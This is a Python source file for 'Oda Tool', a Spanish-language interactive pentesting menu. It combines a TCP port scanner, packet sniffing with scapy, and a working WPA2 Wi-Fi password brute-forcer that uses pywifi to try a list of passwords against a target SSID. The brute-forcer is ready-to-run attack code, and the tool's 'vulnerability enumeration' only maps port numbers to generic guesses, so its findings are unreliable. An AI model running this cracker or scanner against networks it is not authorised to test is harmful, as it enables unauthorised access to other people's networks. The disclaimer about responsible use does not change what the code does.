#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Oda Tool v1.0 - Herramienta interactiva de Pruebas de Penetración
---------------------------------------------------------------
Características:
  - Escaneo de puertos.
  - Enumeración de vulnerabilidades.
  - Ataque de fuerza bruta Wi‑Fi (real, usando pywifi).
  - Análisis de red.
  - Integración con base de datos de vulnerabilidades (archivo JSON).

¡USO RESPONSABLE! Solo para entornos de prueba o con permiso del propietario.
"""

import socket
import json
import time
import threading

# Para análisis de red se requiere scapy
try:
    from scapy.all import sniff, IP, get_if_list
except ImportError:
    sniff = None

# Para ataque de fuerza bruta Wi‑Fi se requiere pywifi
try:
    import pywifi
    from pywifi import const
except ImportError:
    pywifi = None


def print_banner():
    banner = r"""
   ____   ____     _          _______           _    
  / __ \ / __ \   | |        |__   __|   /\    | |   
 | |  | | |  | |  | |  ______   | |     /  \   | |   
 | |  | | |  | |  | | |______|  | |    / /\ \  | |   
 | |__| | |__| |  | |          | |   / ____ \ | |    
  \____/ \____/   |_|          |_|  /_/    \_\|_|    
  
              Oda Tool v1.0
    (Herramienta educativa de pruebas de penetración)
    """
    print(banner)


def port_scan(host, start_port, end_port):
    print(f"\n[+] Escaneando puertos en {host} desde el puerto {start_port} hasta {end_port}...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.5)
            result = sock.connect_ex((host, port))
            if result == 0:
                print(f"    - Puerto {port} abierto")
                open_ports.append(port)
            sock.close()
        except Exception as e:
            print(f"    - Error en puerto {port}: {e}")
    if not open_ports:
        print("    No se detectaron puertos abiertos.")
    return open_ports


def vulnerability_scan(host, open_ports):
    print(f"\n[+] Buscando vulnerabilidades en {host}...")
    vulnerabilities_db = {
        21: "FTP: Posible acceso anónimo o vulnerabilidades en el servicio FTP.",
        22: "SSH: Versión antigua vulnerable a ciertos exploits.",
        80: "HTTP: Riesgo de inyección SQL o problemas en CMS.",
        443: "HTTPS: Configuraciones inseguras en TLS/SSL o certificados expirados."
    }
    found_vulns = {}
    for port in open_ports:
        vuln = vulnerabilities_db.get(port)
        if vuln:
            print(f"    - Puerto {port}: {vuln}")
            found_vulns[port] = vuln
        else:
            print(f"    - Puerto {port}: No se encontró información de vulnerabilidad.")
    return found_vulns


def network_analysis(interface, packet_count=10):
    if sniff is None:
        print("    [!] Scapy no está instalado. Instala scapy para usar análisis de red.")
        return

    print(f"\n[+] Capturando {packet_count} paquetes en la interfaz {interface}...")
    def packet_callback(packet):
        if IP in packet:
            ip_layer = packet[IP]
            print(f"    Paquete: {ip_layer.src} -> {ip_layer.dst}")
    try:
        packets = sniff(iface=interface, count=packet_count, prn=packet_callback)
        print("    Captura completada.")
        return packets
    except Exception as e:
        print(f"    [!] Error al capturar paquetes: {e}")


def check_vulnerabilities_from_db(open_ports, db_file="vuln_db.json"):
    print("\n[+] Consultando base de datos local de vulnerabilidades...")
    try:
        with open(db_file, "r") as f:
            vuln_db = json.load(f)
    except Exception as e:
        print(f"    [!] Error al cargar la base de datos: {e}")
        return {}

    results = {}
    for port in open_ports:
        port_str = str(port)
        if port_str in vuln_db:
            print(f"    - Puerto {port}: {vuln_db[port_str]}")
            results[port] = vuln_db[port_str]
        else:
            print(f"    - Puerto {port}: No hay datos en la base de vulnerabilidades.")
    return results


def wifi_brute_force(ssid, password_list):
    if pywifi is None:
        print("    [!] PyWiFi no está instalado. Instálalo con 'pip install pywifi'.")
        return None

    wifi = pywifi.PyWiFi()
    # Muestra las interfaces disponibles
    ifaces = wifi.interfaces()
    if not ifaces:
        print("    [!] No se detectó ninguna interfaz Wi‑Fi.")
        return None

    print("\n[+] Interfaces Wi‑Fi disponibles:")
    for idx, iface in enumerate(ifaces):
        print(f"    {idx + 1}. {iface.name()}")

    try:
        iface_idx = int(input("Selecciona el número de la interfaz que deseas usar: ").strip()) - 1
        iface = ifaces[iface_idx]
    except (ValueError, IndexError):
        print("    [!] Selección de interfaz no válida.")
        return None

    print(f"\n[+] Usando la interfaz: {iface.name()}")
    iface.disconnect()
    time.sleep(1)
    if iface.status() == const.IFACE_CONNECTED:
        print("    [!] No se pudo desconectar la interfaz, intenta manualmente.")
        return None

    for password in password_list:
        print(f"    Probando contraseña: {password}")
        # Crear un perfil Wi‑Fi con la contraseña a probar
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)
        time.sleep(5)  # Espera a que se intente la conexión

        if iface.status() == const.IFACE_CONNECTED:
            print(f"    [!] Contraseña encontrada: {password}")
            iface.disconnect()
            return password
        else:
            print(f"    [-] Contraseña incorrecta: {password}")
            iface.disconnect()
            time.sleep(1)

    print("    [-] No se encontró la contraseña en la lista proporcionada.")
    return None


def main():
    print_banner()
    host = input("Ingresa el host objetivo (IP o dominio) para el escaneo de puertos: ").strip()
    open_ports = []

    while True:
        print("\nSelecciona una opción:")
        print("1. Escaneo de puertos")
        print("2. Enumerar vulnerabilidades (basado en puertos abiertos)")
        print("3. Ataque de fuerza bruta Wi‑Fi")
        print("4. Análisis de red")
        print("5. Consultar base de datos de vulnerabilidades")
        print("6. Salir")
        
        choice = input("Introduce el número de la opción: ").strip()

        if choice == "1":
            try:
                start_port = int(input("Ingresa el puerto inicial: ").strip())
                end_port = int(input("Ingresa el puerto final: ").strip())
            except ValueError:
                print("Debes ingresar números válidos para los puertos.")
                continue

            # Puedes optar por ejecutar el escaneo en un hilo para no bloquear el menú,
            # pero en este ejemplo se ejecuta de forma secuencial.
            open_ports = port_scan(host, start_port, end_port)

        elif choice == "2":
            if not open_ports:
                print("Primero realiza un escaneo de puertos para obtener puertos abiertos.")
            else:
                vulnerability_scan(host, open_ports)

        elif choice == "3":
            ssid = input("Ingresa el SSID (nombre) de la red Wi‑Fi objetivo: ").strip()
            pw_input = input("Ingresa las contraseñas a probar separadas por comas: ").strip()
            # Se asume que se introducen contraseñas separadas por comas
            password_list = [p.strip() for p in pw_input.split(",") if p.strip()]
            if not ssid or not password_list:
                print("Debes ingresar un SSID y al menos una contraseña.")
                continue
            wifi_brute_force(ssid, password_list)

        elif choice == "4":
            # Mostrar interfaces disponibles para ayudar al usuario
            if sniff is None:
                print("    [!] Scapy no está instalado. Instala scapy para usar análisis de red.")
            else:
                print("\nInterfaces detectadas:")
                iface_list = get_if_list()
                for idx, iface in enumerate(iface_list):
                    print(f"    {idx + 1}. {iface}")
                try:
                    iface_idx = int(input("Selecciona el número de la interfaz para el análisis: ").strip()) - 1
                    interface = iface_list[iface_idx]
                except (ValueError, IndexError):
                    print("Interfaz no válida.")
                    continue
                network_analysis(interface, packet_count=10)

        elif choice == "5":
            if not open_ports:
                print("Realiza primero un escaneo de puertos para determinar los puertos abiertos.")
            else:
                db_file = input("Ingresa el nombre del archivo de base de datos (por defecto: vuln_db.json): ").strip()
                if not db_file:
                    db_file = "vuln_db.json"
                check_vulnerabilities_from_db(open_ports, db_file=db_file)

        elif choice == "6":
            print("Saliendo de Oda Tool. ¡Hasta la próxima!")
            break

        else:
            print("Opción no válida. Por favor, selecciona un número del 1 al 6.")


if __name__ == "__main__":
    main()
